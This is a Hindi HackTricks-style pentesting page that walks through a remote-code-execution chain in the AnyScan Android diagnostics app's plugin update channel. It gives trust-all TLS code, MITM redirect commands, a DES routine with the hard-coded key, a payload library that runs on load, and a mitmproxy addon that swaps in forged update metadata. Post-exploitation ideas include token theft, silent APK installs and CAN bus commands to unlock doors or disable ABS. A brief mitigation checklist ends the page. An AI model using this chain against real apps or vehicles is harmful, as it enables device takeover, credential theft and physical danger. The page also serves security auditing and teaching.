# असुरक्षित इन-ऐप अपडेट तंत्र – दुर्भावनापूर्ण प्लगइन्स के माध्यम से रिमोट कोड निष्पादन

{{#include ../../banners/hacktricks-training.md}}

कई Android अनुप्रयोग अपने **“प्लगइन” या “डायनामिक फीचर” अपडेट चैनल** को Google Play Store के बजाय लागू करते हैं। जब कार्यान्वयन असुरक्षित होता है, तो एक हमलावर जो ट्रैफ़िक को इंटरसेप्ट कर सकता है, **मनमाना नेटिव कोड प्रदान कर सकता है जो ऐप प्रक्रिया के अंदर लोड होगा**, जिससे हैंडसेट पर पूर्ण रिमोट कोड निष्पादन (RCE) हो सकता है - और कुछ मामलों में ऐप द्वारा नियंत्रित किसी भी बाहरी डिवाइस (गाड़ियाँ, IoT, चिकित्सा उपकरण ...) पर।

यह पृष्ठ Xtool **AnyScan** ऑटोमोटिव-डायग्नोस्टिक्स ऐप (v4.40.11 → 4.40.40) में पाए गए एक वास्तविक-विश्व भेद्यता श्रृंखला का सारांश प्रस्तुत करता है और तकनीक को सामान्यीकृत करता है ताकि आप अन्य Android ऐप्स का ऑडिट कर सकें और रेड-टीम एंगेजमेंट के दौरान गलत कॉन्फ़िगरेशन को हथियार बना सकें।

---
## 1. असुरक्षित TLS TrustManager की पहचान करना

1. APK को jadx / apktool के साथ डिकंपाइल करें और नेटवर्किंग स्टैक (OkHttp, HttpUrlConnection, Retrofit…) को खोजें।
2. एक **कस्टम `TrustManager`** या `HostnameVerifier` की तलाश करें जो हर सर्टिफिकेट पर अंधाधुंध भरोसा करता है:
```java
public static TrustManager[] buildTrustManagers() {
return new TrustManager[]{
new X509TrustManager() {
public void checkClientTrusted(X509Certificate[] chain, String authType) {}
public void checkServerTrusted(X509Certificate[] chain, String authType) {}
public X509Certificate[] getAcceptedIssuers() {return new X509Certificate[]{};}
}
};
}
```
3. यदि मौजूद है, तो एप्लिकेशन **किसी भी TLS प्रमाणपत्र** को स्वीकार करेगा → आप एक स्व-हस्ताक्षरित प्रमाणपत्र के साथ एक पारदर्शी **MITM प्रॉक्सी** चला सकते हैं:
```bash
mitmproxy -p 8080 -s addon.py  # see §4
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-ports 8080  # on rooted device / emulator
```
## 2. अपडेट मेटाडेटा का रिवर्स-इंजीनियरिंग

AnyScan मामले में प्रत्येक ऐप लॉन्च एक HTTPS GET को ट्रिगर करता है:
```
https://apigw.xtoolconnect.com/uhdsvc/UpgradeService.asmx/GetUpdateListEx
```
उत्तर शरीर एक **XML दस्तावेज़** है जिसके `<FileData>` नोड्स में **Base64-कोडित, DES-ECB एन्क्रिप्टेड** JSON है जो हर उपलब्ध प्लगइन का विवरण देता है।

विशिष्ट शिकार कदम:
1. क्रिप्टो रूटीन का पता लगाएं (जैसे `RemoteServiceProxy`) और पुनर्प्राप्त करें:
* एल्गोरिदम (DES / AES / RC4 …)
* संचालन का मोड (ECB / CBC / GCM …)
* हार्ड-कोडेड कुंजी / IV (अक्सर 56-बिट DES कुंजी या 128-बिट AES कुंजी स्थिरांक में)
2. मेटाडेटा को डिक्रिप्ट / एन्क्रिप्ट करने के लिए फ़ंक्शन को Python में फिर से लागू करें:
```python
from Crypto.Cipher import DES
from base64 import b64decode, b64encode

KEY = IV = b"\x2A\x10\x2A\x10\x2A\x10\x2A"  # 56-bit key observed in AnyScan

def decrypt_metadata(data_b64: str) -> bytes:
cipher = DES.new(KEY, DES.MODE_ECB)
return cipher.decrypt(b64decode(data_b64))

def encrypt_metadata(plaintext: bytes) -> str:
cipher = DES.new(KEY, DES.MODE_ECB)
return b64encode(cipher.encrypt(plaintext.ljust((len(plaintext)+7)//8*8, b"\x00"))).decode()
```
## 3. एक दुर्भावनापूर्ण प्लगइन बनाएं

1. किसी भी वैध प्लगइन ZIP को चुनें और मूल पुस्तकालय को अपने पेलोड से बदलें:
```c
// libscan_x64.so – constructor runs as soon as the library is loaded
__attribute__((constructor))
void init(void){
__android_log_print(ANDROID_LOG_INFO, "PWNED", "Exploit loaded! uid=%d", getuid());
// spawn reverse shell, drop file, etc.
}
```

```bash
$ aarch64-linux-android-gcc -shared -fPIC payload.c -o libscan_x64.so
$ zip -r PWNED.zip libscan_x64.so assets/ meta.txt
```
2. JSON मेटाडेटा को अपडेट करें ताकि `"FileName" : "PWNED.zip"` और `"DownloadURL"` आपके HTTP सर्वर की ओर इशारा करे।  
3. संशोधित JSON को DES-एन्क्रिप्ट + Base64-एन्कोड करें और इसे इंटरसेप्टेड XML के अंदर वापस कॉपी करें।  

## 4. mitmproxy के साथ Payload भेजें  

`addon.py` उदाहरण जो *चुपचाप* मूल मेटाडेटा को बदलता है:
```python
from mitmproxy import http
MOD_XML = open("fake_metadata.xml", "rb").read()

def request(flow: http.HTTPFlow):
if b"/UpgradeService.asmx/GetUpdateListEx" in flow.request.path:
flow.response = http.Response.make(
200,
MOD_XML,
{"Content-Type": "text/xml"}
)
```
एक साधारण वेब सर्वर चलाएँ ताकि दुर्भावनापूर्ण ZIP को होस्ट किया जा सके:
```bash
python3 -m http.server 8000 --directory ./payloads
```
जब पीड़ित ऐप लॉन्च करता है, तो यह:
* हमारे forged XML को MITM चैनल के माध्यम से fetch करेगा;
* इसे hard-coded DES कुंजी के साथ decrypt और parse करेगा;
* `PWNED.zip` डाउनलोड करेगा → निजी स्टोरेज के अंदर unzip करेगा;
* `dlopen()` के माध्यम से शामिल *libscan_x64.so* को तुरंत execute करेगा **ऐप की अनुमतियों के साथ** (कैमरा, GPS, Bluetooth, फाइल सिस्टम, …)।

चूंकि प्लगइन डिस्क पर cached है, बैकडोर **रीबूट के दौरान बना रहता है** और हर बार चलता है जब उपयोगकर्ता संबंधित फीचर का चयन करता है।

## 5. Post-Exploitation Ideas

* सत्र कुकीज़, OAuth टोकन, या JWTs चुराएं जो ऐप द्वारा संग्रहीत हैं।
* एक दूसरे चरण का APK ड्रॉप करें और इसे चुपचाप `pm install` के माध्यम से इंस्टॉल करें (ऐप के पास पहले से ही `REQUEST_INSTALL_PACKAGES` है)।
* किसी भी जुड़े हार्डवेयर का दुरुपयोग करें - AnyScan परिदृश्य में आप मनमाने **OBD-II / CAN बस कमांड** भेज सकते हैं (दरवाजे अनलॉक करें, ABS बंद करें, आदि)।

---
### Detection & Mitigation Checklist (blue team)

* कभी भी एक कस्टम TrustManager/HostnameVerifier के साथ प्रोडक्शन बिल्ड न भेजें जो प्रमाणपत्र सत्यापन को निष्क्रिय करता है।
* Google Play से बाहर executable कोड डाउनलोड न करें। यदि आपको *करना है*, तो प्रत्येक प्लगइन को एक ही **apkSigning v2** कुंजी के साथ साइन करें और लोड करने से पहले हस्ताक्षर की पुष्टि करें।
* कमजोर/hard-coded क्रिप्टो को **AES-GCM** और एक सर्वर-साइड घूर्णन कुंजी के साथ बदलें।
* डाउनलोड की गई आर्काइव की अखंडता की पुष्टि करें (हस्ताक्षर या कम से कम SHA-256)।

---
## References

- [NowSecure – Remote Code Execution Discovered in Xtool AnyScan App](https://www.nowsecure.com/blog/2025/07/16/remote-code-execution-discovered-in-xtool-anyscan-app-risks-to-phones-and-vehicles/)
- [Android – Unsafe TrustManager patterns](https://developer.android.com/privacy-and-security/risks/unsafe-trustmanager)

{{#include ../../banners/hacktricks-training.md}}
